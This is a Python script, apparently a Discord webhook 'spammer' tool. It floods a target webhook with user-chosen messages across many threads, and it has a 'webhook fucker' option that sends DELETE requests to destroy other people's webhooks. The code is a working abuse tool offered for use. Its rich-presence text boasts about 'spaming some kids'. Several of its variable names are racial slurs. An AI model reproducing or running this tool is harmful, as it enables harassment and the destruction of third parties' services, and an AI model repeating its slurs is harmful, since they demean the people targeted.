import sys
from colorama import Fore, Style
import time
from os import system, name
import os
import requests
import asyncio
import threading
from threading import Timer
import random
from pypresence import Presence
import colorama

opt = f'''
{Style.BRIGHT}{Fore.YELLOW}[{Fore.RESET}1{Style.BRIGHT}{Fore.YELLOW}] webhook spammer
{Style.BRIGHT}{Fore.YELLOW}[{Fore.RESET}2{Style.BRIGHT}{Fore.YELLOW}] webhook fucker
''' 
itadori_logo = ''' ██▓▄▄▄█████▓ ▄▄▄      ▓█████▄  ▒█████   ██▀███   ██▓
▓██▒▓  ██▒ ▓▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒▓██▒
▒██▒▒ ▓██░ ▒░▒██  ▀█▄  ░██   █▌▒██░  ██▒▓██ ░▄█ ▒▒██▒
░██░░ ▓██▓ ░ ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░▒██▀▀█▄  ░██░
░██░  ▒██▒ ░  ▓█   ▓██▒░▒████▓ ░ ████▓▒░░██▓ ▒██▒░██░
░▓    ▒ ░░    ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓  
 ▒ ░    ░      ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░
 ▒ ░  ░        ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░░   ░  ▒ ░
 ░                 ░  ░   ░        ░ ░     ░      ░  
                        ░                            '''
if sys.platform == 'win32':
    loop = asyncio.ProactorEventLoop()
    asyncio.set_event_loop(loop)




#remove this line if your on replit
colorama.init(convert=True)


print(f'{Style.BRIGHT}{Fore.RED}[{Fore.RESET}/{Style.BRIGHT}{Fore.RED}] Rich presence? {Fore.RESET}[Y/N]: ' , end='')
rpC = input()
if rpC.lower() == 'y':
  CLient_id = '902257679186161764'
  RPC = Presence(CLient_id) 
  quotes = ['spaming some kids','itadori spammer best spammer','gojo best waifu']
  RPC = Presence(CLient_id)  
  RPC.connect()
  RPC.update(details="itadori webhook spammer", state=random.choice(quotes), large_image='default', buttons=[{"label": "github", "url": "https://github.com/gohan-chan69/itadori-webhook-spammer-fucker"}])



clear = lambda: os.system("cls")
if sys.platform == "linux":
    clear = lambda: os.system("clear")

def itadori():


     def typewritter2(text):
      for x in text:
        print(f'{Style.BRIGHT}{Fore.RED}' + x, end="")
        sys.stdout.flush()
        time.sleep(0.05)
     def typewritter4(text):
      for x in text:
        print(f'{Style.BRIGHT}{Fore.MAGENTA}' + x, end="")
        sys.stdout.flush()
        time.sleep(0.05)
     def typewritter3(text):
      for x in text:
        print(f'{Style.BRIGHT}{Fore.GREEN}' + x, end="")
        sys.stdout.flush()
        time.sleep(0.03)     

     def typewritter1(text):
      for x in text:
        print(f'{Fore.RED}' + x, end="")
        sys.stdout.flush()
        time.sleep(0.08)          
     def webhook_fucker():
        time.sleep(3)
        typewritter4('enter a webhook you want to fuck: ')
        hooknigga = input('')
        requests.delete(hooknigga)
        response = requests.get(hooknigga)
        status = response.status_code
        if status == 404:
          typewritter3('webhook got deleted')
          menu()
        if status == 500:  
          typewritter3('webhook got deleted')
          menu()
        if status == 200:
          typewritter1("webhook is alive")
          menu()

     def clear():
  
    
       if name == 'nt':
         _ = system('cls')
  
    
       else:
          _ = system('clear')
     def menu():
       os.system('title itadori webhook spammer') 
       clear()
       print(f'{Fore.LIGHTBLUE_EX}{itadori_logo}\n{opt}')
       typewritter2('select an option >> ')
       option = input("")
       if option == '1':
          typewritter4('enter a webhook you want to spam: ')
          webnigga = input('')
          typewritter4('enter the messege you want to spam: ')
          msg_spam = input('')
          typewritter4('enter an amount to spam: ')
          amount = int(input(''))
          threads = []
          for _ in range(amount):
            t = threading.Thread(target=webhook_spammer, args=[webnigga, msg_spam], )
            t.start()
            threads.append(t)
          for thread in threads:
            thread.join()

       if option == '2':
          webhook_fucker()
       else:
          clear()
          
     def webhook_spammer(webnigga, msg_spam):
       spammer_nigger = requests.post(webnigga, json={"content": msg_spam, "name": 'itadori webhook spammer', "avatar_url": "https://i.imgur.com/eSLUiBm.png"})
       if spammer_nigger.status_code == 204:
         print(f'{Style.BRIGHT}{Fore.GREEN}[{Fore.RESET}+{Style.BRIGHT}{Fore.GREEN}] sent ')
       else:
         print(f'{Style.BRIGHT}{Fore.RED}[{Fore.RESET}-{Style.BRIGHT}{Fore.RED}] ratelimited')



         
     menu()
       


       






itadori()







